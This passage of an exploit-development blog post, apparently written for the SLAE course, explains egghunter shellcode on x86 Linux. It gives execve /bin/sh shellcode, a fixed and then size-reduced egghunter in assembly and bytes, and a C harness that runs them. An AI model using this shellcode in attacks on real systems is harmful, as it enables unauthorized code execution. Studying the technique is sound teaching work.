+&lt;p&gt;Depending on the egghunter logic the egg may be required to comprise of executable instructions. That is the egg must be executable if egghunter passes execution to the egg itself and it doesn't have to be executable when the egghunter skips the egg and passes execution to the payload. Note that I didn't say that your egg can comprise of anything you want in the second case. Remember that the egg pattern must be as uncommon as possible. For example, it is not uncommon to encounter or &lt;code&gt;ax, 0xffff&lt;/code&gt; instruction which translates to &lt;code&gt;\x66\x83\xC8\xFF&lt;/code&gt; opcode sequence. And if you choose this sequence as your egg, there is a high possibility that the egghunter will stumble upon this sequence elsewhere in the process memory and transfer execution to the wrong place. So you should be careful when you choose your egg pattern, especially if it shorter than 8 bytes.&lt;/p&gt;
+&lt;p&gt;To satisfy the requirement of executable egg pattern, instructions that don't change the logic of the execution flow are usually used. Vivek Ramachandran calls them &lt;em&gt;nop-equivalents&lt;/em&gt;. For example, the following 1-byte instructions can be mixed to create and executable egg pattern: &lt;code&gt;nop&lt;/code&gt;, &lt;code&gt;push/pop r32&lt;/code&gt;, &lt;code&gt;inc/dec r32&lt;/code&gt;, &lt;code&gt;pushad/popad&lt;/code&gt;, &lt;code&gt;pushfd&lt;/code&gt;, &lt;code&gt;push/pop cs/ds/ss/es&lt;/code&gt;, &lt;code&gt;xchg eax&lt;/code&gt;, &lt;code&gt;r32&lt;/code&gt;, etc.&lt;/p&gt;
+&lt;h1&gt;Analyzing egghunter source code&lt;/h1&gt;
+&lt;p&gt;First we will create a simple shellcode to work with. The shellcode launches the /bin/sh shell using execve system call. Follows the source code and the command used to build the binary.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;section&lt;/span&gt; &lt;span class="nv"&gt;.text&lt;/span&gt;
+    &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="nv"&gt;_start&lt;/span&gt;
+
+&lt;span class="nl"&gt;_start:&lt;/span&gt;
+    &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;    &lt;span class="c1"&gt;; We need some nulls to delimit arguments on the stack&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;        &lt;span class="c1"&gt;; Push the first delimeter: null terminator for the string&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x68732f6e&lt;/span&gt; &lt;span class="c1"&gt;; Push the string with a program name to launch&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x69622f2f&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;    &lt;span class="c1"&gt;; 1st param: pointer to the string of the program to launch&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;        &lt;span class="c1"&gt;; Push nulls on the stack to terminate array of string pointers&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;        &lt;span class="c1"&gt;; Push pointer to string pointer thus creating array of string &lt;/span&gt;
+                    &lt;span class="c1"&gt;; pointers&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;    &lt;span class="c1"&gt;; 2nd param: pointer to array of string pointers (args)&lt;/span&gt;
+    &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;    &lt;span class="c1"&gt;; 3rd param: env vars. Null here works fine.&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;11&lt;/span&gt;      &lt;span class="c1"&gt;; execve syscall&lt;/span&gt;
+    &lt;span class="nf"&gt;int&lt;/span&gt; &lt;span class="mh"&gt;80h&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;div class="divider"&gt;&lt;/div&gt;
+
+&lt;div class="highlight"&gt;&lt;pre&gt;nasm -f elf stacksh.asm &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ld stacksh.o -o stacksh
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;img alt="Making sure payload works" src="http://unlim.xyz/images/egghunter-technqiue-for-exploit-development/making-sure-payload-works.png" title="Making sure payload works" /&gt;
+&lt;div class="img-caption"&gt;Making sure payload works&lt;/div&gt;&lt;/p&gt;
+&lt;p&gt;At our next step we extract the shellcode string from the code section of the binary using &lt;a href="https://github.com/reider-roque/reed/tree/master/tools"&gt;scdump&lt;/a&gt; helper script I created while going through the SLAE course:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Extracting shellcode" src="http://unlim.xyz/images/egghunter-technqiue-for-exploit-development/extracting-shellcode.png" title="Extracting shellcode" /&gt;
+&lt;div class="img-caption"&gt;Extracting shellcode&lt;/div&gt;&lt;/p&gt;
+&lt;p&gt;The extracted shellcode string:
+&lt;code&gt;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Next, I will use the 2nd Linux egghunter shellcode found in the aforementioned paper, fix it, explain how it works and make some modifications to reduce its size. &lt;/p&gt;
+&lt;p&gt;Here is the initial egghunter source with my comments:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nl"&gt;_start:&lt;/span&gt;
+    &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;        &lt;span class="c1"&gt;; We begin from the lowest memory and need it to be 0&lt;/span&gt;
+&lt;span class="nl"&gt;.nextpage:&lt;/span&gt;
+    &lt;span class="nf"&gt;or&lt;/span&gt; &lt;span class="nb"&gt;dx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xfff&lt;/span&gt;        &lt;span class="c1"&gt;; This and the next instruction combined add 0x1000 (4096)&lt;/span&gt;
+                &lt;span class="c1"&gt;; to the edx register; this is a size of memory page&lt;/span&gt;
+&lt;span class="nl"&gt;.nextbyte:&lt;/span&gt;
+    &lt;span class="nf"&gt;inc&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;     &lt;span class="c1"&gt;; Either compliment the previous instruction and go to the&lt;/span&gt;
+                &lt;span class="c1"&gt;; next page or go to the next byte&lt;/span&gt;
+    &lt;span class="nf"&gt;lea&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x4&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  &lt;span class="c1"&gt;; Load the next after the current dword into ebx&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;byte&lt;/span&gt; &lt;span class="mh"&gt;0x21&lt;/span&gt;  &lt;span class="c1"&gt;; This and the next instruction load the access syscall&lt;/span&gt;
+    &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;     &lt;span class="c1"&gt;; code into the eax&lt;/span&gt;
+    &lt;span class="nf"&gt;int&lt;/span&gt; &lt;span class="mh"&gt;80h&lt;/span&gt;     &lt;span class="c1"&gt;; Tell kernel to do the syscall&lt;/span&gt;
+    &lt;span class="nf"&gt;cmp&lt;/span&gt; &lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xf2&lt;/span&gt;        &lt;span class="c1"&gt;; See if syscall returned EFAULT error which means that we&lt;/span&gt;
+    &lt;span class="nf"&gt;jz&lt;/span&gt; &lt;span class="nv"&gt;.nextpage&lt;/span&gt;        &lt;span class="c1"&gt;; landed on inaccessible memory page and should skip it&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x50905090&lt;/span&gt;  &lt;span class="c1"&gt;; If we landed on the correct memory address, load the&lt;/span&gt;
+                   &lt;span class="c1"&gt;; eax with our egg to compare&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;edi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;        &lt;span class="c1"&gt;; Check if the first dword in the 8 byte sequence matches&lt;/span&gt;
+    &lt;span class="nf"&gt;scasd&lt;/span&gt;           &lt;span class="c1"&gt;; our egg ...&lt;/span&gt;
+    &lt;span class="nf"&gt;jnz&lt;/span&gt; &lt;span class="nv"&gt;.nextbyte&lt;/span&gt;   &lt;span class="c1"&gt;; ... and continue to the next byte if not, or ...&lt;/span&gt;
+    &lt;span class="nf"&gt;scasd&lt;/span&gt;           &lt;span class="c1"&gt;; ... if it matches check it is the case with 2nd dword ...&lt;/span&gt;
+    &lt;span class="nf"&gt;jnz&lt;/span&gt; &lt;span class="nv"&gt;.nextbyte&lt;/span&gt;   &lt;span class="c1"&gt;; ... and continue to the next byte if not, or ...&lt;/span&gt;
+    &lt;span class="nf"&gt;jmp&lt;/span&gt; &lt;span class="nb"&gt;edi&lt;/span&gt;     &lt;span class="c1"&gt;; ... the egg is found! Pass control to the main payload&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The egghunter searches for an 8 byte doubled-egg - &lt;code&gt;\x90\x50\x90\x50\x90\x50\x90\x50&lt;/code&gt;. That's why it checks for matching dword &lt;code&gt;0x50905090&lt;/code&gt; two times. &lt;/p&gt;
+&lt;p&gt;The following instruction sequence&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;or&lt;/span&gt; &lt;span class="nb"&gt;dx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xfff&lt;/span&gt;
+&lt;span class="nf"&gt;inc&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;is equivalent to&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x1000&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;But because of the smart trick employed by the author to reduce the code size, second part of the sequence is actually "reused" for traversing bytes inside of a valid memory page. &lt;/p&gt;
+&lt;p&gt;In the following instruction&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;lea&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x4&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;value 0x4 is added to the address held in EDX because it allows eight bytes of contiguous memory to be validated in a single swoop. The reason that it works in all cases is because the implementation will increment by page size when it encounters invalid addresses, thus it’s impossible that EDX+0x4 could be valid and EDX itself not.&lt;/p&gt;
+&lt;p&gt;To traverse through memory the implementation relies on the &lt;code&gt;access&lt;/code&gt; system call (0x21) that checks whether the calling process can access the file at the specified pathname. But its main functionality is not used in this case. The implementation actually uses the side effect of the function: when it tries to access the pathname string by its address loaded in EBX it returns an &lt;code&gt;EFAULT&lt;/code&gt; error meaning that pathname points outside of process's accessible address space. So when we get the &lt;code&gt;EFAULT&lt;/code&gt; error code returned in EAX we may conclude that EBX points to unmapped inaccessible memory and hence we can safely skip the current page and check the next one.&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;EFAULT&lt;/code&gt; constant is defined as equal to 14 (0xe). But when this error occurs the kernel actually returns its value negated: -EFAULT = -0xe = 0xffffffff-0xe = 0xfffffff2. That's why the following part of the code&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;cmp&lt;/span&gt; &lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xf2&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;checks if AL (lowest 8 bits of EAX register) contains 0xf2.&lt;/p&gt;
+&lt;h1&gt;Fixing the bug&lt;/h1&gt;
+&lt;p&gt;The access function signature can be found in Linux manual pages by running &lt;code&gt;man 2 access&lt;/code&gt; command:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;int access(const char *pathname, int mode);
+…
+ERRORS
+        access() shall fail if:
+        …
+        EFAULT pathname points outside your accessible address space.
+        EINVAL mode was incorrectly specified.
+        …
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Note that it actually takes 2 parameters. And it was the reason the reference implementation did not work for me. Most likely Linux developers have changed internal implementation of the &lt;code&gt;access&lt;/code&gt; function from the time skape wrote his paper. &lt;/p&gt;
+&lt;p&gt;Following Linux syscall convention the 1st syscall argument goes into EBX register, 2nd into ECX, 3rd into EDX, etc. The correct values for the second argument that must be put into ECX, according to the man page and &lt;code&gt;/usr/include/unistd.h&lt;/code&gt; file, can be a value of 0 through 7. And when it is not the case the function, instead of &lt;code&gt;EFAULT&lt;/code&gt; returns &lt;code&gt;EINVAL&lt;/code&gt; error and the whole construction collapses resulting in a segfault. To fix the issue I had to insert&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;right before &lt;code&gt;int 80h&lt;/code&gt; instruction, effectively setting the second argument for the access function to be 0, which is a valid value.&lt;/p&gt;
+&lt;p&gt;Now, after the egghunter is fixed we can build a binary out of it and extract the payload:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;nasm -f elf egghunter2.asm &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ld egghunter2.o -o egghunter2
+scdump egghunter2
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Output (formatted to fit the screen):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;Length: 37
+Payload: &amp;quot;\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\x31\xc9\xcd&amp;quot;
+&amp;quot;\x80\x3c\xf2\x74\xec\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7&amp;quot;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Note that original shellcode length (35 bytes) increased by 2 bytes because of the applied fix.&lt;/p&gt;
+&lt;p&gt;After inserting the egghunter and our earlier generated payload into a C source code and compiling it we get a working PoC:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;gcc scframe.c -fno-stack-protector -z execstack -o scframe &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./scframe
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;img alt="Working egghunter PoC" src="http://unlim.xyz/images/egghunter-technqiue-for-exploit-development/working-egghunter-poc.png" title="Working egghunter PoC" /&gt;
+&lt;div class="img-caption"&gt;Working egghunter PoC&lt;/div&gt;&lt;/p&gt;
+&lt;p&gt;Contents of the scframe.c:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
+&lt;span class="cp"&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
+
+&lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;egghunter&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  
+&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\x31\xc9\xcd\x80\x3c&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
+&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xf2\x74\xec\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+&lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 
+&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x90\x50\x90\x50\x90\x50\x90\x50&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;  &lt;span class="c1"&gt;// EGG&lt;/span&gt;
+&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="c1"&gt;// SHELLCODE&lt;/span&gt;
+&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Egghunter length: %d&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;egghunter&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Shellcode length: %d&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+
+    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="n"&gt;egghunter&lt;/span&gt;&lt;span class="p"&gt;)();&lt;/span&gt;
+
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1&gt;Reducing the size&lt;/h1&gt;
+&lt;p&gt;Trying to reduce the size of the shellcode I looked at other Linux syscalls hoping to find one whose side effect I could use in a similar manner and that takes only one pointer argument. And I found one - &lt;code&gt;chdir&lt;/code&gt;. The only argument the function takes is the pointer to a string containing path. It is not as good as the access function and in the worst case scenario, if it encounters a valid directory path in the process memory you will end up running in some random directory. On the positive side using this system call we can claim back the added bytes by removing the &lt;code&gt;xor ecx, ecx&lt;/code&gt; instruction. The changed part of the egghunter:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;byte&lt;/span&gt; &lt;span class="mh"&gt;0xc&lt;/span&gt;   &lt;span class="c1"&gt;; chdir syscall # &lt;/span&gt;
+    &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
+    &lt;span class="nf"&gt;int&lt;/span&gt; &lt;span class="mh"&gt;80h&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;After re-building the egghunter, extracting the shellcode with &lt;code&gt;scdump&lt;/code&gt;, inserting it into our C program and finally building it we get another working sample which is 35 bytes long:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Egghunter with replaced system call" src="http://unlim.xyz/images/egghunter-technqiue-for-exploit-development/egghunter-with-replaced-system-call.png" title="Egghunter with replacecd system call" /&gt;
+&lt;div class="img-caption"&gt;Egghunter with replaced system call&lt;/div&gt;&lt;/p&gt;
+&lt;p&gt;Next to win us a couple more bytes we can use 4 bytes long egg and modify the algorithm. To solve the problem of storing the same egg pattern with the egghunter algo we can simply modify the egg after loading it into EAX register and then prepend the modified version to the main payload. This change eliminates check for the second dword of 8-byte long egg. The modified code follows:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;section&lt;/span&gt; &lt;span class="nv"&gt;.text&lt;/span&gt;
+    &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="nv"&gt;_start&lt;/span&gt;
+
+&lt;span class="nl"&gt;_start:&lt;/span&gt;
+    &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;
+&lt;span class="nl"&gt;.nextpage:&lt;/span&gt;
+    &lt;span class="nf"&gt;or&lt;/span&gt; &lt;span class="nb"&gt;dx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xfff&lt;/span&gt;
+&lt;span class="nl"&gt;.nextbyte:&lt;/span&gt;
+    &lt;span class="nf"&gt;inc&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;
+    &lt;span class="nf"&gt;lea&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;byte&lt;/span&gt; &lt;span class="mh"&gt;0xc&lt;/span&gt;        &lt;span class="c1"&gt;; chdir syscall&lt;/span&gt;
+    &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
+    &lt;span class="nf"&gt;int&lt;/span&gt; &lt;span class="mh"&gt;80h&lt;/span&gt;
+    &lt;span class="nf"&gt;cmp&lt;/span&gt; &lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xf2&lt;/span&gt;
+    &lt;span class="nf"&gt;jz&lt;/span&gt; &lt;span class="nv"&gt;.nextpage&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x50905090&lt;/span&gt;
+    &lt;span class="nf"&gt;inc&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;edi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;
+    &lt;span class="nf"&gt;scasd&lt;/span&gt;
+    &lt;span class="nf"&gt;jnz&lt;/span&gt; &lt;span class="nv"&gt;.nextbyte&lt;/span&gt;
+    &lt;span class="nf"&gt;jmp&lt;/span&gt; &lt;span class="nb"&gt;edi&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Note how we need to change the egg in front of our main payload in the C program. The first byte is now &lt;code&gt;\x91&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 
+&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x91\x50\x90\x50&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;  &lt;span class="c1"&gt;// EGG&lt;/span&gt;
+&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt; &lt;span class="c1"&gt;// SHELLCODE&lt;/span&gt;
+&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Building and running C program with updated egghunter and egg we get the working result with 32-bytes long egghunter:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Final egghunter version, 32 bytes long" src="http://unlim.xyz/images/egghunter-technqiue-for-exploit-development/egghunter-final-version.png" title="Final egghunter version, 32 bytes long" /&gt;
+&lt;div class="img-caption"&gt;Final egghunter version, 32 bytes long&lt;/div&gt;&lt;/p&gt;
+&lt;div class="divider"&gt;&lt;/div&gt;
+
+&lt;div class="divider"&gt;&lt;/div&gt;
+
+&lt;div class="divider"&gt;&lt;/div&gt;
+
+&lt;div class="divider"&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;hr&gt;
+This blog post was created for completing the requirements of the &lt;a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/"&gt;SecurityTube Linux Assembly Expert&lt;/a&gt; certification. Student id: SLAE-685.&lt;/p&gt;
+&lt;p&gt;The source files created while completing the assignment can be found in my &lt;a href="https://github.com/reider-roque/slae"&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;</summary><category term="exploit-development"></category><category term="slae"></category></entry></feed>
